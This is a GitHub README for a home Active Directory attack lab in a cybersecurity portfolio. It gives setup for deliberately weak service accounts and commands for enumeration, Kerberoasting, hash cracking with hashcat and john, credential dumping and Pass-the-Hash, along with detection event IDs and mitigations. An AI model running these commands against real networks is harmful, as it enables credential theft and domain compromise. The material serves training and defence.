# Active-Directory-Attack-Lab
Active Directory Attack Lab for personal simulation 

# 🏠 Active Directory Attack Lab

> A hands-on home lab demonstrating real-world Active Directory attack techniques: Kerberoasting, Pass-the-Hash, credential dumping, and BloodHound path analysis.

**Author:** Tobi Bolaji | [@hijay166](https://github.com/hijay166)
**Certifications:** CompTIA Security+ | CompTIA Network+

---

## ⚠️ Legal Disclaimer

All techniques demonstrated here are for **educational purposes in isolated lab environments only**. Never use against systems you don't own or have explicit written permission to test.

---

## Lab Architecture

```
┌─────────────────────────────────────────────────┐
│                  Host Machine                    │
│              (VirtualBox / VMware)               │
│                                                  │
│  ┌──────────────┐      ┌──────────────────────┐  │
│  │  Kali Linux  │◄────►│  Windows Server 2019 │  │
│  │  (Attacker)  │      │  (Domain Controller) │  │
│  │  10.10.10.10 │      │  lab.local           │  │
│  └──────────────┘      │  10.10.10.1          │  │
│                        └──────────────────────┘  │
│                        ┌──────────────────────┐  │
│                        │  Windows 10 Pro      │  │
│                        │  (Domain Workstation)│  │
│                        │  10.10.10.20         │  │
│                        └──────────────────────┘  │
└─────────────────────────────────────────────────┘
```

---

## Lab Setup

### Requirements

- VirtualBox or VMware (free)
- Windows Server 2019 Evaluation ISO (free from Microsoft)
- Windows 10 Evaluation ISO (free from Microsoft)
- Kali Linux ISO (free)
- 8GB+ RAM, 60GB+ disk

### Step 1 — Windows Server 2019 (Domain Controller)

```powershell
# Install AD Domain Services role
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest -DomainName "lab.local" -InstallDNS

# Create vulnerable service accounts (for Kerberoasting practice)
New-ADUser -Name "svc_sql" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add="MSSQLSvc/dc01.lab.local:1433"}

New-ADUser -Name "svc_iis" -AccountPassword (ConvertTo-SecureString "Service2024!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity svc_iis -ServicePrincipalNames @{Add="HTTP/webserver.lab.local"}

# Create regular user for initial access
New-ADUser -Name "jsmith" -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) -Enabled $true
```

### Step 2 — Windows 10 Workstation

```powershell
# Join the domain (run as admin)
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
```

### Step 3 — Kali Linux (Attacker)

```bash
# Install required tools
sudo apt update && sudo apt install -y \
    enum4linux \
    ldap-utils \
    bloodhound \
    neo4j \
    crackmapexec

pip install impacket bloodhound
```

---

## Attack Modules

### Module 1: Enumeration

```bash
python3 ad_attack_lab.py --dc-ip 10.10.10.1 --domain lab.local \
  --username jsmith --password Welcome1! --module enum
```

**What it does:** Scans for open AD ports, runs enum4linux, dumps users via LDAP and RPC.

**Key findings to look for:**
- Users without lockout policies
- Accounts with weak passwords
- Machines with SMB signing disabled

---

### Module 2: Kerberoasting

```bash
python3 ad_attack_lab.py --dc-ip 10.10.10.1 --domain lab.local \
  --username jsmith --password Welcome1! --module kerberoast
```

**Theory:** Any domain user can request a Kerberos service ticket (TGS) for any SPN. The ticket is encrypted with the service account's NTLM hash — crackable offline.

**Crack the hashes:**
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs kerberoast_hashes.txt --wordlist=rockyou.txt
```

**Detection:** Windows Event ID 4769 — Kerberos Service Ticket with RC4 encryption.

---

### Module 3: Pass-the-Hash

```bash
# First dump hashes (requires admin)
python3 ad_attack_lab.py --dc-ip 10.10.10.1 --domain lab.local \
  --username Administrator --password 'Lab@2024!' --module dump

# Then use the hash to authenticate
python3 ad_attack_lab.py --dc-ip 10.10.10.1 --domain lab.local \
  --username Administrator --password '' \
  --module pth --target-ip 10.10.10.20 \
  --hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Theory:** Windows NTLM accepts the hash directly for authentication — no plaintext needed. Extract a hash once, use it everywhere that account is valid.

**Detection:** Event ID 4624 Logon Type 3 (network logon) from unexpected source IPs.

---

### Module 4: BloodHound Analysis

```bash
python3 ad_attack_lab.py --dc-ip 10.10.10.1 --domain lab.local \
  --username jsmith --password Welcome1! --module bloodhound
```

**Then in GUI:**
1. `sudo neo4j start`
2. Open BloodHound → Upload ZIP
3. Run pre-built queries:
   - "Shortest Paths to Domain Admins"
   - "Find Principals with DCSync Rights"
   - "Kerberoastable Accounts"

---

## Write-Up: Full Attack Chain

### Scenario: External attacker → Domain Admin

| Step | Technique | Tool |
|------|-----------|------|
| 1 | Port scan, identify AD services | Nmap |
| 2 | Password spray, gain foothold as `jsmith` | CrackMapExec |
| 3 | Enumerate SPNs, Kerberoast `svc_sql` | Impacket GetUserSPNs |
| 4 | Crack hash offline, gain `svc_sql` creds | Hashcat |
| 5 | `svc_sql` has local admin on DB server — dump hashes | secretsdump |
| 6 | DA hash in dump — Pass-the-Hash to DC | wmiexec |
| 7 | Full domain compromise | — |

---

## Defensive Recommendations

| Attack | Mitigation |
|--------|-----------|
| Kerberoasting | Use 25+ char random passwords for service accounts; use Group Managed Service Accounts (gMSA) |
| Pass-the-Hash | Enable Protected Users group; disable NTLM where possible; use Credential Guard |
| BloodHound paths | Regular ACL audits; remove unnecessary AdminTo edges; tiered admin model |
| Credential dumping | Enable Windows Defender Credential Guard; restrict LSASS access |

---

## Tools Used

`Impacket` · `BloodHound` · `enum4linux` · `Nmap` · `CrackMapExec` · `Hashcat` · `Python 3`

---

*Part of Tobi Bolaji's cybersecurity portfolio — [github.com/hijay166](https://github.com/hijay166)*
